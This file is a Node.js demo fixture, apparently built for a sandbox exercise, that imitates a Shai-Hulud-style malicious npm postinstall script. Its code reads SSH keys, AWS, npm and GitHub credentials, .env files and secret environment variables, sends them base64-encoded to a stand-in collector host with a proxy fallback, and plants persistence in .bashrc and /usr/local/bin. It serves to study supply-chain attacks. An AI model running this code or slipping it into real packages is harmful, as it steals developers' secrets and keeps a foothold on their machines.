// QUARANTINE DEMO FIXTURE — imitates a credential-stealing postinstall (Shai-Hulud style).
// Harmless by construction: it only reads decoy files planted by the sandbox and
// "exfiltrates" to a reserved .example domain that does not exist.
const fs = require('fs');
const os = require('os');
const path = require('path');
const http = require('http');
const https = require('https');

const loot = {};
const targets = ['.npmrc', '.aws/credentials', '.ssh/id_rsa', '.config/gh/hosts.yml'];
for (const t of targets) {
  try { loot[t] = fs.readFileSync(path.join(os.homedir(), t), 'utf8'); } catch (e) { /* ignore */ }
}
try { loot['.env'] = fs.readFileSync(path.join(process.cwd(), '.env'), 'utf8'); } catch (e) {}
for (const k of Object.keys(process.env)) {
  if (/TOKEN|SECRET|KEY/i.test(k)) loot['env:' + k] = process.env[k];
}

const payload = Buffer.from(JSON.stringify(loot)).toString('base64');

// 1) direct HTTPS to the collector (works on a laptop without a proxy)
const direct = https.request({ host: 'webhook.exfil-collector.example', path: '/c', method: 'POST', timeout: 3000 });
direct.on('error', () => {});
direct.end(payload);

// 2) proxy-aware fallback, like real stealers built for corporate networks
const proxy = process.env.HTTP_PROXY || process.env.http_proxy;
if (proxy) {
  const u = new URL(proxy);
  const tok = (process.env.GITHUB_TOKEN || '');
  const req = http.request({
    host: u.hostname, port: u.port, method: 'POST', timeout: 3000,
    path: 'http://webhook.exfil-collector.example/collect?gh=' + encodeURIComponent(tok),
    headers: { 'Content-Type': 'text/plain', 'Content-Length': Buffer.byteLength(payload) },
  });
  req.on('error', () => {});
  req.end(payload);

  // 3) Shai-Hulud also used the stolen GitHub token to publish a public repo
  const gh = http.request({ host: u.hostname, port: u.port, method: 'CONNECT', path: 'api.github.com:443', timeout: 3000 });
  gh.on('error', () => {});
  gh.end();
}

// 4) persistence: shell profile hook + an attempt to drop a binary on PATH
try { fs.appendFileSync(path.join(os.homedir(), '.bashrc'), '\n(node ~/.cache/.cu/agent.js &) 2>/dev/null\n'); } catch (e) {}
try { fs.writeFileSync('/usr/local/bin/color-utils-update', '#!/bin/sh\n'); } catch (e) {}

setTimeout(() => process.exit(0), 3500);
